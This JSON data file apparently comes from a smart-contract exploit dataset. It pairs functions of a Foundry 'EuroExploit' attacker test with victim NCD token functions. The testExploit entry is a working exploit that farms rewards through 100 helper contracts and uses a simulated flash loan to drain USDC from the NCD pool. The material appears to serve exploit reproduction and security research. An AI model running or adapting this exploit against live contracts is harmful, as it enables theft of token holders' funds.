[
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 39_253_639);\n        usdc_.approve(address(router), type(uint256).max);\n        ncd_.approve(address(router), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "EuroExploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(usdc_), address(this), 10 ether); //Assume this is an exchange for uniswap, not flashloan!\n        emit log_named_decimal_uint(\"ack before usdc_ balance = \", usdc_.balanceOf(address(this)), usdc_.decimals());\n        address[] memory path = new address[](2);\n        path[0] = address(usdc_);\n        path[1] = address(ncd_);\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            10 ether, 0, path, address(this), type(uint256).max\n        );\n        ncd_.transfer(address(ncd_usdc_pair_), ncd_.balanceOf(address(this)) * 5 / 100);\n\n        for (uint256 i = 0; i < 100; i++) {\n            LetTheContractHaveRewards letTheContractHaveRewards = new LetTheContractHaveRewards();\n            letTheContractHaveRewards.preStartTimeRewards();\n            letTheContractHaveRewardss.push(letTheContractHaveRewards);\n        }\n\n        vm.warp(block.timestamp + 1 days);\n\n        deal(address(usdc_), address(this), 10_000 ether); //flashloan 10000 usdc\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            10_000 ether, 0, path, address(this), type(uint256).max\n        );\n        for (uint256 i = 0; i < letTheContractHaveRewardss.length; i++) {\n            LetTheContractHaveRewards letTheContractHaveRewards = letTheContractHaveRewardss[i];\n            ncd_.transfer(address(letTheContractHaveRewards), ncd_.balanceOf(address(this)));\n            letTheContractHaveRewards.ack();\n        }\n        while (ncd_.balanceOf(address(this)) > 1000 ether) {\n            // for(uint256 i = 0; i < 100; i++){\n            LetTheContractHaveUsdc letTheContractHaveUsdc = new LetTheContractHaveUsdc();\n            ncd_.transfer(address(letTheContractHaveUsdc), ncd_.balanceOf(address(this)));\n            letTheContractHaveUsdc.withdraw();\n        }\n\n        usdc_.transfer(address(0xdead), 10_030 ether); // repay flashLoan\n        emit log_named_decimal_uint(\"profit usdc_ balance = \", usdc_.balanceOf(address(this)), usdc_.decimals());\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) external override view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) external override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) external override view returns (uint256) {\n        // if(account == address(uniswapV2Pair))\n        //     return _balances[account].sub(getBurnAmount());\n        return _balances[account];\n    }\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() external override view returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "mineStartTime",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() external override view returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "  function owner() public view returns (address) {\n    return _owner;\n  }\n\n  modifier onlyOwner() {\n    require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n    _;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() external override view returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() external override view returns (uint256) {\n        return _totalSupply.sub(_balances[walletDead]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address recipient, uint256 amount) external override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {\n\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"BEP20: transfer amount exceeds allowance\"));\n        return true;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "INcd",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LetTheContractHaveRewards",
    "source_type": "victim_contract",
    "function_name": "ack",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LetTheContractHaveRewards",
    "source_type": "victim_contract",
    "function_name": "preStartTimeRewards",
    "original_code": "",
    "description": ""
  }
]